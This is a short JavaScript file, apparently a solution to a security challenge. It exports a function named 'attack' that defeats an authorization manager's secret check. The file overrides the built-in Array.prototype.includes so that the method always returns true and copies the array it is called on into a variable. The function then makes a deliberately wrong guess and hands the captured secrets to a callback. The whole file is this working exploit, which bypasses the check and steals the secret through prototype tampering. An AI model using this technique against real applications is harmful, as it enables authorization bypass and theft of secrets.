let stolen;

// Do you really need to know? :) 
Array.prototype.includes = function(nevermind){
  stolen = this.join();
  return true;
}

export const attack = (authzManager, success) => {
  authzManager.guessSecret('wrong');
  if (stolen) {
    success(stolen);
  }
};
